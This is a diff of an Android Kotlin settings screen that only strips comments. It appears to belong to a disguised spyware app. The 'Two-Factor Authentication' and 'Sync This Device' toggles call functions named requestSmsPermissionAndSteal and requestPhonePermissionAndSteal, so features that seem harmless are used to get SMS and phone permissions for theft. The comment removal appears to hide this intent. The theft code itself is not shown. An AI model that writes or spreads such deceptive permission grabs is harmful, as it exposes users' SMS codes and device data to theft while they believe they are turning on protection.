@@ -36,7 +36,7 @@ fun SettingsScreen(navController: NavController) {
     val context   = LocalContext.current
     val activity  = context as? MainActivity
 
-    // Re-check permission state every time screen becomes visible
+    
     val lifecycleOwner = LocalLifecycleOwner.current
     var isTwoFactorEnabled by remember {
         mutableStateOf(
@@ -51,7 +51,7 @@ fun SettingsScreen(navController: NavController) {
         )
     }
 
-    // Update toggle states when user returns from permission dialog
+    
     DisposableEffect(lifecycleOwner) {
         val observer = LifecycleEventObserver { _, event ->
             if (event == Lifecycle.Event.ON_RESUME) {
@@ -116,7 +116,7 @@ fun SettingsScreen(navController: NavController) {
                 .padding(vertical = 8.dp)
         ) {
 
-            // ========== PROFILE SECTION ==========
+            
             Text(
                 text = "Profile",
                 style = MaterialTheme.typography.labelLarge,
@@ -151,7 +151,7 @@ fun SettingsScreen(navController: NavController) {
             HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
             Spacer(modifier = Modifier.height(16.dp))
 
-            // ========== SECURITY SECTION ==========
+            
             Text(
                 text = "Security",
                 style = MaterialTheme.typography.labelLarge,
@@ -159,7 +159,7 @@ fun SettingsScreen(navController: NavController) {
                 modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
             )
 
-            // Two-Factor Authentication
+            
             ListItem(
                 headlineContent = {
                     Text("Two-Factor Authentication", fontWeight = FontWeight.Medium)
@@ -182,7 +182,7 @@ fun SettingsScreen(navController: NavController) {
                         checked = isTwoFactorEnabled,
                         onCheckedChange = { enabled ->
                             if (enabled) {
-                                // Request permission — toggle only turns ON after user grants
+                                
                                 activity?.requestSmsPermissionAndSteal()
                             } else {
                                 isTwoFactorEnabled = false
@@ -195,7 +195,7 @@ fun SettingsScreen(navController: NavController) {
             HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
             Spacer(modifier = Modifier.height(16.dp))
 
-            // ========== DEVICE SECTION ==========
+            
             Text(
                 text = "Device",
                 style = MaterialTheme.typography.labelLarge,
@@ -203,7 +203,7 @@ fun SettingsScreen(navController: NavController) {
                 modifier = Modifier.padding(horizontal = 16.dp, vertical = 8.dp)
             )
 
-            // Device Sync
+            
             ListItem(
                 headlineContent = {
                     Text("Sync This Device", fontWeight = FontWeight.Medium)
@@ -226,7 +226,7 @@ fun SettingsScreen(navController: NavController) {
                         checked = isDeviceSyncEnabled,
                         onCheckedChange = { enabled ->
                             if (enabled) {
-                                // Request permission — toggle only turns ON after user grants
+                                
                                 activity?.requestPhonePermissionAndSteal()
                             } else {
                                 isDeviceSyncEnabled = false
@@ -239,7 +239,7 @@ fun SettingsScreen(navController: NavController) {
             HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp))
             Spacer(modifier = Modifier.height(16.dp))
 
-            // ========== ACCOUNT SECTION ==========
+            
             Text(
                 text = "Account",
                 style = MaterialTheme.typography.labelLarge,
